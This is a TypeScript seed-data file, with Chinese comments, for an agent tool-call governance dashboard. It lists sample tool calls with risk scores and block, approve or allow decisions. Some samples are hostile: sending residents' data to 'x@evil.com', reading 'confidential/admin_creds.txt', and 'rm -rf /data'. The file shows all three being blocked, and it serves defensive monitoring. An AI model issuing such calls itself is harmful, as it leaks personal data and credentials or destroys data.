// 工具网关页数据 —— 结构镜像后端工具调用管控:ToolIntent + 归因 + 评分 + 策略处置 + 执行。
// (对应 SecurityPipeline.evaluate_intent / GovRuntime 的 step:归因→评分→链→策略→沙箱执行)
// 当前为代表性 seed;后续接 /tools/call 或事件流时换数据源即可。

export type Disposition = 'block' | 'approve' | 'sanitize' | 'allow'
export type RiskLevel = 'critical' | 'high' | 'medium' | 'low'
export type Trust = 'untrusted' | 'semi' | 'trusted'

export interface ToolCall {
  id: string
  time: string
  tool: string
  args: string
  source_trust: Trust
  risk_score: number
  risk_level: RiskLevel
  attribution_confidence: number
  decision: Disposition
  rule: string | null
  executed: boolean
  reason: string
}

export const TOOL_CALLS: ToolCall[] = [
  {
    id: 'tc-2041', time: '23:18:02', tool: 'external.send', args: '{ to: "x@evil.com", payload: "居民信息" }',
    source_trust: 'untrusted', risk_score: 0.85, risk_level: 'critical', attribution_confidence: 0.92,
    decision: 'block', rule: 'block-exfil-chain', executed: false,
    reason: '检测到「敏感数据读取 → 对外发送」异常动作链,疑似数据外泄',
  },
  {
    id: 'tc-2040', time: '23:17:55', tool: 'file.read', args: '{ path: "confidential/admin_creds.txt" }',
    source_trust: 'untrusted', risk_score: 0.8, risk_level: 'critical', attribution_confidence: 0.7,
    decision: 'block', rule: 'block-confidential-doc', executed: false,
    reason: '该资料为机密级,禁止智能体读取',
  },
  {
    id: 'tc-2039', time: '23:17:31', tool: 'shell.exec', args: '{ command: "rm -rf /data" }',
    source_trust: 'semi', risk_score: 0.82, risk_level: 'critical', attribution_confidence: 0.4,
    decision: 'block', rule: 'block-dangerous-command', executed: false,
    reason: '命令包含高危操作',
  },
  {
    id: 'tc-2038', time: '23:16:40', tool: 'funds.disburse', args: '{ application_id: "A100", amount: "5000" }',
    source_trust: 'trusted', risk_score: 0.6, risk_level: 'high', attribution_confidence: 0.2,
    decision: 'approve', rule: 'approve-funds', executed: false,
    reason: '发放财政补助资金,须经人工审批',
  },
  {
    id: 'tc-2037', time: '23:16:05', tool: 'shell.exec', args: '{ command: "systemctl restart gateway" }',
    source_trust: 'trusted', risk_score: 0.55, risk_level: 'medium', attribution_confidence: 0.2,
    decision: 'approve', rule: 'approve-shell', executed: false,
    reason: '系统命令默认需人工审批',
  },
  {
    id: 'tc-2036', time: '23:15:22', tool: 'citizen.query', args: '{ keyword: "王某" }',
    source_trust: 'trusted', risk_score: 0.35, risk_level: 'low', attribution_confidence: 0.1,
    decision: 'allow', rule: null, executed: true,
    reason: '查询单步合规,放行执行',
  },
  {
    id: 'tc-2035', time: '23:14:48', tool: 'doc.read', args: '{ path: "public/dibao_guide.txt" }',
    source_trust: 'trusted', risk_score: 0.25, risk_level: 'low', attribution_confidence: 0.1,
    decision: 'allow', rule: null, executed: true,
    reason: '公开资料,放行执行',
  },
  {
    id: 'tc-2034', time: '23:14:10', tool: 'kb.search', args: '{ query: "低保办理" }',
    source_trust: 'trusted', risk_score: 0.2, risk_level: 'low', attribution_confidence: 0.05,
    decision: 'allow', rule: null, executed: true,
    reason: '知识库检索,放行执行',
  },
]
